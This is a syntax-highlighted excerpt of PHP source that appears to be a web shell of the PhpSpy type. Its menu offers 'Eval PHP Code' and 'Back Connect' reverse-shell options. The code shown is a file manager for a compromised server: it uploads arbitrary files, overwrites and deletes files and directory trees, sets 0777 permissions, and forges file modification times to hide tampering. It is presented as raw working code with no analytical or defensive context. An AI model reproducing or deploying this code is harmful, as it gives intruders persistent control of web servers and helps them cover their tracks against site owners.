<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('eval');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Eval</span> <span style="color: #ff9da4; font-weight: bold;">PHP</span> <span style="color: #ff9da4; font-weight: bold;">Code</span><span style="color: #bbdaff;">&lt;/a&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">if</span> (!<span style="color: #ff9da4; font-weight: bold;">IS_WIN</span>) {<span style="color: #ebbbff;">?&gt;</span> | <span style="color: #bbdaff;">&lt;a</span> <span style="color: #bbdaff;">href=</span><span style="color: #99ffff;">"javascript:g('backconnect');"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Back</span><span style="text-decoration: underline;"> </span><span style="color: #ff9da4; font-weight: bold; text-decoration: underline;">Connect</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/a&gt;</span><span style="color: #ebbbff; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> }</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/tr&gt;</span>
<span style="color: #bbdaff;">&lt;/table&gt;</span>
<span style="color: #bbdaff;">&lt;table</span> <span style="color: #bbdaff;">width=</span><span style="color: #99ffff;">"100%"</span> <span style="color: #bbdaff;">border=</span><span style="color: #99ffff;">"0"</span> <span style="color: #bbdaff;">cellpadding=</span><span style="color: #99ffff;">"15"</span> <span style="color: #bbdaff;">cellspacing=</span><span style="color: #99ffff;">"0"</span><span style="color: #bbdaff;">&gt;&lt;tr&gt;&lt;td&gt;</span>
<span style="color: #ebbbff;">&lt;?php</span>
$<span style="color: #ffeead;">errmsg</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">m(</span>$<span style="color: #ffeead;">errmsg</span>);

<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;</span>
<span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">dir</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dir</span> = $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">"DOCUMENT_ROOT"</span>] ? $<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">"DOCUMENT_ROOT"</span>] : <span style="color: #99ffff;">'.'</span>;
}
$<span style="color: #ffeead;">nowpath</span> = <span style="color: #ffffff; background-color: #002451;">getPath(</span><span style="color: #ff9da4; font-weight: bold;">SA_ROOT</span>, $<span style="color: #ffeead;">dir</span>);
<span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">substr(</span>$<span style="color: #ffeead;">dir</span>, -<span style="color: #ffffff; background-color: #002451;">1</span>) != <span style="color: #99ffff;">'/'</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dir</span> = $<span style="color: #ffeead;">dir</span>.<span style="color: #99ffff;">'/'</span>;
}

<span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">action</span> == <span style="color: #99ffff;">'file'</span>) {

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dir_writeable</span> = @<span style="color: #ffffff; background-color: #002451;">is_writable(</span>$<span style="color: #ffeead;">nowpath</span>) ? <span style="color: #99ffff;">'Writable'</span> : <span style="color: #99ffff;">'Non-writable'</span>;

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#21019;&#24314;&#30446;&#24405;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">newdirname</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">mkdirs</span> = $<span style="color: #ffeead;">nowpath</span><span style="color: #ff9da4; font-weight: bold;">.</span>$<span style="color: #ffeead;">newdirname</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">mkdirs</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Directory has already existed'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Directory created '</span>.(@<span style="color: #ffffff; background-color: #002451;">mkdir(</span>$<span style="color: #ffeead;">mkdirs</span>,<span style="color: #ffffff; background-color: #002451;">0777</span>) ? <span style="color: #99ffff;">'success'</span> : <span style="color: #99ffff;">'failed'</span>)<span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">chmod(</span>$<span style="color: #ffeead;">mkdirs</span>,<span style="color: #ffffff; background-color: #002451;">0777</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#19978;&#20256;&#25991;&#20214;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">doupfile</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'File upload '</span>.(@<span style="color: #ffffff; background-color: #002451;">copy(</span>$<span style="color: #bbdaff;">_FILES</span>[<span style="color: #99ffff;">'uploadfile'</span>][<span style="color: #99ffff;">'tmp_name'</span>],$<span style="color: #ffeead;">uploaddir</span>.<span style="color: #99ffff;">'/'</span><span style="text-decoration: underline;">.$</span><span style="color: #bbdaff; text-decoration: underline;">_FILES</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'uploadfile'</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">]) ? </span><span style="color: #99ffff; text-decoration: underline;">'success'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#32534;&#36753;&#25991;&#20214;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">editfilename</span> &amp;&amp; $<span style="color: #ffeead;">filecontent</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fp</span> = @<span style="color: #ffffff; background-color: #002451;">fopen(</span>$<span style="color: #ffeead;">editfilename</span>,<span style="color: #99ffff;">'w'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Save file '</span>.(@<span style="color: #ffffff; background-color: #002451;">fwrite(</span>$<span style="color: #ffeead;">fp</span>,$<span style="color: #ffeead;">filecontent</span>) ? <span style="color: #99ffff;">'success'</span> : <span style="color: #99ffff;">'failed'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   @<span style="color: #ffffff; background-color: #002451;">fclose(</span>$<span style="color: #ffeead;">fp</span>);
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">pfile</span> &amp;&amp; $<span style="color: #ffeead;">newperm</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">pfile</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'The original file does not exist'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">newperm</span> = <span style="color: #ffffff; background-color: #002451;">base_convert(</span>$<span style="color: #ffeead;">newperm</span>,<span style="color: #ffffff; background-color: #002451;">8</span>,<span style="color: #ffffff; background-color: #002451;">10</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Modify file attributes '</span>.(@<span style="color: #ffffff; background-color: #002451;">chmod(</span>$<span style="color: #ffeead;">pfile</span>,$<span style="color: #ffeead;">newperm</span>) ? <span style="color: #99ffff;">'success'</span> : <span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#25913;&#21517;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">oldname</span> &amp;&amp; $<span style="color: #ffeead;">newfilename</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">nname</span> = $<span style="color: #ffeead;">nowpath</span><span style="color: #ff9da4; font-weight: bold;">.</span>$<span style="color: #ffeead;">newfilename</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">nname</span>) || !<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">oldname</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span>$<span style="color: #ffeead;">nname</span>.<span style="color: #99ffff;">' has already existed or original file does not exist'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(basename(</span>$<span style="color: #ffeead;">oldname</span>).<span style="color: #99ffff;">' renamed '</span>.<span style="color: #ffffff; background-color: #002451;">basename(</span>$<span style="color: #ffeead;">nname</span>).(@<span style="color: #ffffff; background-color: #002451;">rename(</span>$<span style="color: #ffeead;">oldname</span>,<span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">nname</span><span style="text-decoration: underline;">) ? </span><span style="color: #99ffff; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#22797;&#21046;&#25991;&#20214;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">sname</span> &amp;&amp; $<span style="color: #ffeead;">tofile</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">tofile</span>) || !<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">sname</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'The goal file has already existed or original file does not exist</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(basename(</span>$<span style="color: #ffeead;">tofile</span>).<span style="color: #99ffff;">' copied '</span>.(@<span style="color: #ffffff; background-color: #002451;">copy(</span>$<span style="color: #ffeead;">sname</span>,$<span style="color: #ffeead;">tofile</span>) ? <span style="color: #ffffff; background-color: #002451;">basename(</span>$<span style="color: #ffeead;">to</span><span style="color: #ffeead; text-decoration: underline;">file</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#20811;&#38534;&#26102;&#38388;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">curfile</span> &amp;&amp; $<span style="color: #ffeead;">tarfile</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!@<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">curfile</span>) || !@<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">tarfile</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'The goal file has already existed or original file does not exist</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">time</span> = @<span style="color: #ffffff; background-color: #002451;">filemtime(</span>$<span style="color: #ffeead;">tarfile</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Modify file the last modified '</span>.(@<span style="color: #ffffff; background-color: #002451;">touch(</span>$<span style="color: #ffeead;">curfile</span>,$<span style="color: #ffeead;">time</span>,$<span style="color: #ffeead;">time</span>) ? <span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#33258;&#23450;&#20041;&#26102;&#38388;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">curfile</span> &amp;&amp; $<span style="color: #ffeead;">year</span> &amp;&amp; $<span style="color: #ffeead;">month</span> &amp;&amp; $<span style="color: #ffeead;">day</span> &amp;&amp; $<span style="color: #ffeead;">hour</span> &amp;&amp; $<span style="color: #ffeead;">minute</span> &amp;&amp; $<span style="color: #ffeead;">second</span>) <span style="text-decoration: underline;">{</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!@<span style="color: #ffffff; background-color: #002451;">file_exists(</span>$<span style="color: #ffeead;">curfile</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(basename(</span>$<span style="color: #ffeead;">curfile</span>).<span style="color: #99ffff;">' does not exist'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">time</span> = <span style="color: #ffffff; background-color: #002451;">strtotime(</span><span style="color: #99ffff;">"$year-$month-$day $hour:$minute:$second"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Modify file the last modified '</span>.(@<span style="color: #ffffff; background-color: #002451;">touch(</span>$<span style="color: #ffeead;">curfile</span>,$<span style="color: #ffeead;">time</span>,$<span style="color: #ffeead;">time</span>) ? <span style="color: #99ffff;">'</span><span style="color: #99ffff; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">elseif</span>($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'delfiles'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">dl</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dfiles</span>=<span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">succ</span> = $<span style="color: #ffeead;">fail</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">dl</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">filepath</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_dir(</span>$<span style="color: #ffeead;">filepath</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (@<span style="color: #ffffff; background-color: #002451;">deltree(</span>$<span style="color: #ffeead;">filepath</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">succ</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fail</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (@<span style="color: #ffffff; background-color: #002451;">unlink(</span>$<span style="color: #ffeead;">filepath</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">succ</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fail</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Deleted folder/file have finished,choose '</span>.<span style="color: #ffffff; background-color: #002451;">count(</span>$<span style="color: #ffeead;">dl</span>).<span style="color: #99ffff;">' success '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">succ</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">' fail '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">fail</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">m(</span><span style="color: #99ffff;">'Please select folder/file(s)'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#25805;&#20316;&#23436;&#27605;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=<span style="color: #bbdaff;">&gt;</span><span style="color: #99ffff;">'createdir'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'newdirname'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'fileperm'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'newperm'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'pfile'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'copyfile'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'sname'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'tofile'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'rename'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'oldname'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'newfilename'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>,$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'fileopform'</span>, <span style="color: #99ffff;">'target'</span>=&gt;<span style="color: #99ffff;">'_blank'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'opfile'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formhead(array(</span><span style="color: #99ffff;">'name'</span>=&gt;<span style="color: #99ffff;">'getsize'</span>));
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'getdir'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'dir'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">formfoot(</span>);

